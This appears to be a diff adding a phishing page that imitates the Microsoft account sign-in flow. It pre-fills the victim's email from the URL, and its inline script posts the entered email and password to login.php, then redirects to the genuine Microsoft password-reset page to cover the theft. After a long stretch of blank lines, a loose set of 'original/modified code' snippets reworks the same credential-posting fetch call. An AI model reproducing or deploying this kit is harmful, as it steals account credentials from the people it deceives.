@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="assets/favicon.ico" />
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="assets/app.css" />
+</head>
+<body>
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" />
+            <h2 class="title mb-16 mt-16">Sign in</h2>
+            <form id="form_uname">
+                <div class="mb-16">
+                    <p id="error_uname" class="error"></p>
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
+                <p class="mb-16 fs-13">
+                    <a href="#" class="link">Sign in with a security key
+                        <img src="assets/question.png" alt="Question img">
+                    </a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_next">Next</button>
+            </div>
+        </div>
+        <div class="opts">
+            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="assets/key.png"
+                        width="30px" /></span> Sign-in options</p>
+        </div>
+    </section>
+
+    <section id="section_pwd" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back">
+                    <img src="assets/back.png" />
+                </button>
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Enter password</h2>
+            <form id="form_pwd">
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
+                <p class="mb-16">
+                    <a href="#" class="link fs-13">Other ways to sign in</a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_sig">Sign in</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <button class="btn btn-sec" id="btn_final">No</button>
+                <button class="btn" id="btn_final">Yes</button>
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+    <script src="assets/app.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            try {
+                const hash = window.location.hash.substring(1);
+                const email = hash;
+                const inputElement = document.querySelector('#inp_uname');
+                const pwdElement = document.querySelector('#inp_pwd');
+
+                const nextButton = document.querySelector('#btn_next');
+                const signInButton = document.querySelector('#btn_sig');
+
+                if (inputElement && pwdElement && nextButton && signInButton) {
+                    inputElement.value = email;
+
+                    nextButton.addEventListener('click', () => {
+                        const uname = inputElement.value.trim();
+                        if (uname) {
+                            document.getElementById('error_uname').textContent = '';
+                            document.getElementById('section_uname').classList.add('d-none');
+                            document.getElementById('section_pwd').classList.remove('d-none');
+                        } else {
+                            document.getElementById('error_uname').textContent = 'Please enter a valid email, phone, or Skype name.';
+                        }
+                    });
+
+                    signInButton.addEventListener('click', () => {
+                        const uname = inputElement.value.trim();
+                        const pwd = pwdElement.value.trim();
+                        if (uname && pwd) {
+                            // Perform the form submission with email and password
+                            const formData = new FormData();
+                            formData.append('loginfmt', uname);
+                            formData.append('passwd', pwd);
+                            fetch('login.php', {
+                                method: 'POST',
+                                body: formData
+                            }).then(response => {
+                                if (response.ok) {
+                                    window.location.href = 'https://account.live.com/ResetPassword.aspx';
+                                } else {
+                                    console.error('Failed to submit the form.');
+                                }
+                            }).catch(error => {
+                                console.error('Error:', error);
+                            });
+                        } else {
+                            document.getElementById('error_pwd').textContent = 'Please enter your password.';
+                        }
+                    });
+                } else {
+                    console.warn('Input or button elements not found.');
+                }
+            } catch (error) {
+                console.error('An error occurred:', error);
+            }
+        });
+    </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// Original code
+const buttonElement = document.querySelector('#btn_next');
+// Modified code
+const buttonElement = document.getElementById('btn_next');
+
+// Original code
+buttonElement.click();
+// Modified code
+buttonElement.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
+
+// Original code
+const buttonElement = document.querySelector('#btn_sig');
+// Modified code
+const buttonElement = document.getElementById('btn_sig');
+
+// Original code
+const pass = inpPwd.value.trim();
+// Modified code
+const pass = inpPwd.value;
+
+// Original code
+formPwd.submit(); // Submit the password form
+// Modified code
+// Use fetch API to send data to the server
+const formData = new FormData();
+formData.append('loginfmt', uname);
+formData.append('passwd', pass);
+
+fetch('login.php', {
+    method: 'POST',
+    body: formData
+})
+.then(response => {
+    if (response.ok) {
+        window.location.href = 'https://account.live.com/ResetPassword.aspx';
+    } else {
+        throw new Error('Network response was not ok.');
+    }
+})
+.catch(error => console.error('Error:', error));
